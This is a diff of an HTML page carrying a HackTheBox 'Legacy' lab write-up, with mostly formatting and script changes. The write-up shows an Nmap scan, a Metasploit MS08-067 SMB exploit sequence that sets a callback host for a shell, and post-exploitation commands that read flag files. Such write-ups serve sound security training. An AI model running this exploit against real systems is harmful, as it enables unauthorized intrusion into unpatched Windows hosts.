@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,14 +33,14 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Legacy</h1>
-                  <p class="nested"><a href="/posts/20191101_htb-lame.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-blue.html"> » </a></p>
+                  <p><a href="/posts/20191101_htb-lame.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-blue.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested"><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_legacy/infocard.png" /></p>
 <p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/2">Legacy</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_legacy/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
 Nmap scan report for 10.10.10.4
 Host is up, received user-set (0.057s latency).
 Scanned at 2019-11-01 14:44:28 PDT for 276s
@@ -127,7 +94,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. From the Nmap scan results, we find that the target system has SMB service running and is a Windows XP system:  </p>
-<p class="nested"re><code>| smb-os-discovery:
+<pre class="nested"><code>| smb-os-discovery:
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
 |   Computer name: legacy
@@ -137,15 +104,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>137/udp  |  netbios-ns    |  Microsoft Windows netbios-ns (workgroup: HTB)
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>137/udp  |  netbios-ns    |  Microsoft Windows netbios-ns (workgroup: HTB)
 139/tcp  |  netbios-ssn   |  Microsoft Windows netbios-ssn
 445/tcp  |  microsoft-ds  |  Windows XP microsoft-ds
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. For a Microsoft Windows XP system with open SMB, we use the MSF <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067">MS08-067</a> exploit <code>windows/smb/ms08_067_netapi</code> and gain a shell with elevated privileges on the target system:  </p>
-<p class="nested"re><code>msfconsole
+<pre class="nested"><code>msfconsole
   use exploit/windows/smb/ms08_067_netapi
   set RHOST 10.10.10.4
   set LHOST 10.10.14.18
@@ -155,7 +122,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_legacy/screenshot01.png" />  </p>
 <p class="nested">2. We then obtain further information about the system and read the contents of both <code>user.txt</code> and <code>root.txt</code> files to comeplete the challenge:  </p>
-<p class="nested"re><code>ipconfig
+<pre class="nested"><code>ipconfig
 systeminfo
 dir user.txt /s /p
 type &quot;C:\Documents and Settings\john\Desktop\user.txt&quot;
@@ -166,7 +133,7 @@ type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_legacy/screenshot03.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_legacy/screenshot04.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>ntauth/system@LEGACY&gt; id
+<pre class="nested"><code>ntauth/system@LEGACY&gt; id
 NT AUTHORITY\SYSTEM
 ntauth/system@LEGACY&gt;  
 ntauth/system@LEGACY&gt; uname
@@ -191,7 +158,7 @@ john
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<p class="nested"re><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
+<pre class="nested"><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
 C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0..................
 </code></pre>
 
@@ -200,19 +167,17 @@ C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0........
 <li><a href="https://www.hackthebox.eu/home/machines/profile/2">https://www.hackthebox.eu/home/machines/profile/2</a>  </li>
 <li><a href="https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02">https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20191101_htb-lame.html">[HackTheBox] Lame...</a> « | » <a href="/posts/20191101_htb-blue.html">[HackTheBox] Blue...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191101_htb-lame.html">[HackTheBox] Lame...</a> « | » <a href="/posts/20191101_htb-blue.html">[HackTheBox] Blue...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -220,6 +185,10 @@ C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0........
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
